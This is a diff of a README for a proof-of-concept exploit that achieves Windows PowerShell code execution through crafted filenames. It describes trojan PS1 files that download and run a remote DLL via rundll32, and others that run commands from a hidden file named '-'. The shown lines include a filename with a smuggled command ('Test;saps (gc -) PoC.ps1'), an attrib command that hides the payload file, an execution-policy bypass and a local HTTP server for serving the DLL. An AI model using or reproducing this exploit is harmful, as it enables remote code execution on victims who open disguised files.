@@ -4,6 +4,7 @@ Windows PowerShell Filename Code Execution POC
 Dusted this off and improved it a bit: <br> 
 1) Execute a remote DLL using rundll32
 2) Execute an unintended secondary PS1 script or hidden text-file
+3) Updated the PS1 Trojan Filename Creator Python3 Script
 
 First reported to Microsoft back in 2019 yet remains unfixed as of the time of this writing. <br>  
 Remote code execution via a specially crafted filename. <br>  
@@ -22,7 +23,7 @@ Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
 
 Leverages alternate shorthand PS commands like "saps", "gc" start a process and get-content etc.
 
-DLL Execution: create a trojan PS1 file that will try to download and execute a remote DLL namec "1.d"
+DLL Execution Example: create a trojan PS1 file that will try to download and execute a remote DLL namec "1.d"
 
 Python: <br>  
 from base64 import b64encode <br>  
@@ -56,12 +57,17 @@ return 0; <br>
 
 python -m http.server 80
 
-Double click the trojan PS1 file.
+Double click the trojan PS1 file. <br>  
 
-Text-file named dash "-" Code Execution.
-Create a PS1 file with name including saps "start a process" and gc "get-content", this will read commands from hidden file.
-"Test;saps (gc -) PoC.ps1"
-Create hidden: attrib +s +h "-"
+
+Text-file Based Code Execution Example: <br>  
+
+Create a PS1 file with name including saps "start a process" and gc "get-content", this will read commands from hidden file. <br>  
+
+"Test;saps (gc -) PoC.ps1" <br>  
+
+Create hidden: attrib +s +h "-" <br>  
+
 Double click or drag and drop.
 
 
